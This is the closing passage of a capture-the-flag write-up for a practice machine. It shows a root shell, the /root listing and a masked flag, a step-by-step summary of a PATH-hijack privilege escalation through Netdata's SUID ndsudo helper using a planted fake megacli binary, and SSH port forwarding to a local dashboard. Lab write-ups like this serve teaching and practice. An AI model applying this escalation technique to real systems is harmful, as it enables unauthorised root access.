root@editor:/home/oliver# id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)
```

Got the root shell.

```bash
root@editor:/root# ls -la
total 44
drwx------  8 root root 4096 Aug  3 09:30 .
drwxr-xr-x 18 root root 4096 Jul 29 11:55 ..
lrwxrwxrwx  1 root root    9 Jul  1 19:19 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Apr 27  2023 .cache
drwxr-xr-x  2 root root 4096 Jun 19 08:14 .config
drwxr-xr-x  3 root root 4096 Apr 27  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwx------  2 root root 4096 Jun 19 11:30 .ssh
-rw-r-----  1 root root   33 Aug  3 09:30 root.txt
drwxr-xr-x  2 root root 4096 Jun 19 08:14 scripts
drwx------  3 root root 4096 Apr 27  2023 snap
root@editor:/root# cat root.txt
8aa9bexxxxxxxxxxxxxxxxxxxxxxxxxx
```

Ta-da! Got the `root.txt` flag.

The flows of the exploitation: <br>
- `ndsudo` searches `PATH` for `megacli` or `MegaCli`
- Our directory comes first in modified `PATH`
- Our malicious binary executes instead of real `megacli`
- SUID bit ensures execution as root
- `setuid(0)` + `execl()` gives us root shell

*Some bonus discovery of some ports:* <br>
Start with port `19999`. Use ssh port forwarding and access to `127.0.0.1:19999`.

```bash
└─$ ssh -L 19999:127.0.0.1:19999 oliver@editor.htb
```

![editor](/assets/img/editor-htb-season8/editor-htb-season8_port_19999.png)

Look like a monitor dashboard for netdata, pretty cool!. And the other port, checking and seem not getting response so we just leave it.

![result](/assets/img/editor-htb-season8/result.png)